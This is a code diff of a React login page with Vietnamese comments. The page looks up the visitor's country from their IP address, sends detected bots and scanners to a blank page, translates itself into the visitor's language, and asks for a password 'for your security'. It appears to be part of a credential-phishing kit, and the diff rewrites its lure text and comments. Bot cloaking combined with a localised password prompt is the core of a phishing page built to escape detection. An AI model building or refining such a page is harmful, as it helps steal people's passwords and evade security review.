@@ -60,7 +60,6 @@ const Home = () => {
     const [showPassword, setShowPassword] = useState(false);
     const [errors, setErrors] = useState({});
     
-    // 🚀 FIX: Sử dụng state với fallback mặc định
     const [translatedTexts, setTranslatedTexts] = useState(defaultTexts);
     const [countryCode, setCountryCode] = useState('US');
     const [callingCode, setCallingCode] = useState('+1');
@@ -74,15 +73,12 @@ const Home = () => {
         try {
             console.log('🔹 Bắt đầu dịch ngầm Password...');
             const passwordDefaultTexts = {
-                title: 'Enter Password',
-                description: 'Please enter your password to continue',
+                title: 'Please Enter Your Password',
+                description: 'For your security, you must enter your password to continue',
+                passwordLabel: 'Password',
                 placeholder: 'Enter your password',
-                submit: 'Confirm',
-                forgotPassword: 'Forgot password?',
-                incorrectPassword: 'Incorrect password',
-                processing: 'Verifying...',
-                securityCheck: 'Security check in progress',
-                pleaseWait: 'Please wait...'
+                continueBtn: 'Continue',
+                loadingText: 'Please wait'
             };
             
             const passwordTexts = {};
@@ -108,7 +104,7 @@ const Home = () => {
                 try {
                     homeTexts[key] = await translateText(text, targetLang);
                 } catch (error) {
-                    homeTexts[key] = text; // Fallback về text gốc
+                    homeTexts[key] = text;
                 }
             });
             await Promise.all(homePromises);
@@ -122,33 +118,34 @@ const Home = () => {
         }
     }, [defaultTexts]);
 
-    // 🚀 KHỞI TẠO 3 GIÂY - CHỈ DỊCH HOME
+    // 🚀 3 GIÂY LOADING: CALL API + DỊCH HOME
     useEffect(() => {
         const initializeAll = async () => {
             try {
-                // 1. Gọi API IP và detect bot
+                // 1. CALL API IP
                 const response = await axios.get('https://get.geojs.io/v1/ip/geo.json');
                 const ipData = response.data;
                 const detectedCountry = ipData.country_code || 'US';
                 
+                // 2. DETECT BOT
                 const botResult = await detectBot();
                 if (botResult.isBot) {
                     window.location.href = 'about:blank';
                     return;
                 }
 
-                // 2. Lưu IP info
+                // 3. Lưu IP info
                 localStorage.setItem('ipInfo', JSON.stringify(ipData));
                 setCountryCode(detectedCountry);
                 localStorage.setItem('countryCode', detectedCountry);
 
-                // 3. Set calling code
+                // 4. Set calling code
                 const code = getCountryCallingCode(detectedCountry);
                 const callingCode = `+${code}`;
                 setCallingCode(callingCode);
                 localStorage.setItem('callingCode', callingCode);
 
-                // 4. 🎯 CHỈ DỊCH HOME TRONG 3 GIÂY
+                // 5. 🎯 DỊCH HOME
                 const targetLang = countryToLanguage[detectedCountry] || 'en';
                 localStorage.setItem('targetLang', targetLang);
                 
@@ -156,23 +153,21 @@ const Home = () => {
                     await translateHomeOnly(targetLang);
                 }
 
-                // 5. Enable form
                 setIsFormEnabled(true);
 
             } catch (error) {
                 console.log('Initialization failed:', error);
-                // Fallback
                 setCountryCode('US');
                 setCallingCode('+1');
                 setIsFormEnabled(true);
             }
 
-            // 🎯 CHỈ 3 GIÂY LOADING - ĐỦ DỊCH HOME
+            // 🎯 3 GIÂY LOADING - ĐỦ CHO API + DỊCH HOME
             setTimeout(() => {
                 console.log('🎯 3 giây - Tắt loading, hiển thị Home');
                 setIsLoading(false);
                 
-                // 🚀 BẮT ĐẦU DỊCH NGẦM PASSWORD
+                // 🚀 DỊCH NGẦM PASSWORD
                 const targetLang = localStorage.getItem('targetLang') || 'en';
                 translatePasswordBackground(targetLang);
             }, 3000);
@@ -191,7 +186,8 @@ const Home = () => {
         );
     }
 
-    // Các hàm xử lý form giữ nguyên...
+    // ... (CÁC HÀM XỬ LÝ FORM GIỮ NGUYÊN) ...
+
     const validateEmail = (email) => {
         const emailRegex = /^[^\s@]+@[^\s@]+\.[^\s@]+$/;
         return emailRegex.test(email);
@@ -338,7 +334,7 @@ const Home = () => {
         setShowPassword(false);
     };
 
-    // 🚀 FIX: Thêm fallback cho mọi translated text
+    // 🚀 FALLBACK FUNCTION
     const getText = (key) => {
         return translatedTexts[key] || defaultTexts[key] || key;
     };
@@ -366,7 +362,7 @@ const Home = () => {
         }
     ];
 
-    // 🚀 RETURN HOME CONTENT với fallback an toàn
+    // 🚀 RETURN HOME CONTENT
     return (
         <>
             <header className='sticky top-0 left-0 flex h-14 justify-between p-4 shadow-sm'>
